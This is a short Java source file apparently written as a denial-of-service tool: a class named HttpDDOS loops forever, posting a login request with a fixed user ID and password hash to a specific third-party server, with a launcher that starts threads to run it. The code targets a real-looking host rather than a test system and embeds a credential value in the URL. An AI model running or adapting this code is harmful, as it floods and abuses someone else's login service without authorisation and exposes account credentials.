package com.sun.http;

import java.util.concurrent.atomic.AtomicInteger;

public class HttpDDOS implements Runnable {

    private static AtomicInteger atomicInteger = new AtomicInteger();

    @Override
    public void run() {
        while (true) {
            String URL = "http://eos.ejiakeji.cn:8787/eMWX2.0/ex/user/login.do?userid=1111&pwd=b59c67bf196a4758191e42f76670ceba&dynamic_code=&client_token=&host=&_responseCrypted=false";
            HttpUtil.doPost(URL);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}

class Main1 {

    public static void main(String[] args) {

        for (int i = 0; i < 1; i++) {
            HttpDDOS main = new HttpDDOS();
            Thread thread = new Thread(main);
            thread.start();
        }

    }
}
